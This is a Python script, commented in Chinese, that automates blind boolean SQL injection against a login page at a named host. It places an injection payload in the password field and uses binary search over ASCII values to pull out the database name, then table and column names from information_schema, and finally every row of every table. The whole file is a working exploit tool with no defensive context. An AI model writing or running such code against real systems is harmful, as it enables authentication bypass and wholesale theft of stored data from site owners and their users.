import requests
import time


############################################################################################################
#                                          注入判断函数
############################################################################################################
def judge(value,type,name_type = 'DATABASE()',char_num = 1):



    if (type=='char'):
        data_test={'account':'136688608','pass':'\')or(ASCII(SUBSTR(('+name_type+'),'+str(char_num)+',1))>'+str(value)+')LIMIT 1;#'}
        r = requests.post(url,data=data_test)
        return ('http://www.zhh.com/loggedin.php'==r.url)
    else:
        data_test={'account':'136688608','pass':'\')or(LENGTH('+name_type+')>'+str(value)+')LIMIT 1;#'}
        r = requests.post(url,data=data_test)
        return ('http://www.zhh.com/loggedin.php'==r.url)

############################################################################################################
#                                          提取查询字符函数
############################################################################################################
def get_name_char(name_type = 'DATABASE()',char_num = 1):
    name_ord = ''
    value = 64
    num = 32
    while(1):
        if (judge(value,'char',name_type,char_num)):
            value+=num
        elif (judge(value-1,'char',name_type,char_num)):
                name_ord=value
                break
        else:
            value -= num
        num=num/2
        if(num<1):
            num = 1
        if(value<0):
            name_ord=0
            print('Error-Error-Error-Error-Error-Error-Error-Error-Error-Error-Error-Error-Error-Error-Error-Error-Error')
            break
    return chr(int(name_ord))
############################################################################################################
#                                        提取查询长度函数
############################################################################################################
def get_name_length(name_type = 'DATABASE()'):
    name_length = 0
    value = 64
    num = 32
    while(1):
        if (judge(value,'length',name_type)):
            value+=num
        elif (judge(value-1,'length',name_type)):
                name_length=value
                break
        else:
            value -= num
        num=num/2
        if(num<1):
            num = 1
        if(value<0):
            name_length=0
            print('Error-Error-Error-Error-Error-Error-Error-Error-Error-Error-Error-Error-Error-Error-Error-Error-Error')
            break
    return int(name_length)
############################################################################################################
#                                         提取查询全名函数
############################################################################################################
def get_name(name_type = 'DATABASE()'):
    name_length = get_name_length(name_type)
    name = ''
    for value in range(1,name_length+1):
        name += get_name_char(name_type,value)
    print(str(name))
    return name
############################################################################################################


############################################################################################################
#                                         main函数
############################################################################################################提供参数
time_start = time.time()
url='http://www.zhh.com/login.php'
database_messages = {}
############################################################################################################提取数据库名
name_DATABASE = 'DATABASE()'
database_messages['database'] = get_name(name_DATABASE)
############################################################################################################提取表数量
name_TABLE_NUM = '(select count(table_name) from information_schema.tables where table_schema=\''+database_messages['database']+'\')'
database_messages['table_num'] = get_name(name_TABLE_NUM)
############################################################################################################提取表名
for value in range(1,int(database_messages['table_num'])+1):
    name_TABLE_NAME = '(select table_name from information_schema.tables where table_schema=\''+database_messages['database']+'\' LIMIT '+str(value-1)+',1)'
    database_messages['table'+str(value)+'_name'] = get_name(name_TABLE_NAME)


############################################################################################################提取列数量
for value in range(1,int(database_messages['table_num'])+1):
    name_COLUMNS_NUM = '(select count(column_name) from information_schema.columns where table_name=\''+database_messages['table'+str(value)+'_name']+'\')'
    database_messages['table'+str(value)+'_columns_num'] = get_name(name_COLUMNS_NUM)
############################################################################################################提取列名
for table_num in range(1,int(database_messages['table_num'])+1):
    for colum_num in range(1,int(database_messages['table'+str(table_num)+'_columns_num'])+1):
        name_COLUMNS_NAME = '(select column_name from information_schema.columns where table_name=\''+database_messages['table'+str(table_num)+'_name']+'\' LIMIT '+str(colum_num-1)+',1)'
        database_messages['table'+str(table_num)+'_columns'+str(colum_num)+'_name'] = get_name(name_COLUMNS_NAME)
############################################################################################################提取表记录数量
for table_num in range(1,int(database_messages['table_num'])+1):
        name_DATA_NUM = '(select count('+database_messages['table'+str(table_num)+'_columns1_name']+') from '+database_messages['table'+str(table_num)+'_name']+')'
        database_messages['table'+str(table_num)+'_columns_data_num'] = get_name(name_DATA_NUM)
############################################################################################################提取列记录
for table_num in range(1,int(database_messages['table_num'])+1):
    for colum_num in range(1,int(database_messages['table'+str(table_num)+'_columns_num'])+1):
        for data_num in range(1,int(database_messages['table'+str(table_num)+'_columns_data_num'])+1):
            name_DATA = '(select '+database_messages['table'+str(table_num)+'_columns'+str(colum_num)+'_name']+' FROM '+database_messages['table'+str(table_num)+'_name']+' ORDER BY '+database_messages['table'+str(table_num)+'_columns1_name']+' LIMIT '+str(data_num-1)+',1)'
            database_messages['table'+str(table_num)+'_columns'+str(colum_num)+'_data'+str(data_num)] = get_name(name_DATA)
############################################################################################################打印结果
time_end = time.time()
for key,value in database_messages.items():
    print(key,':',value,'\n')
print('耗时：',str(time_end-time_start),'(s)\n')
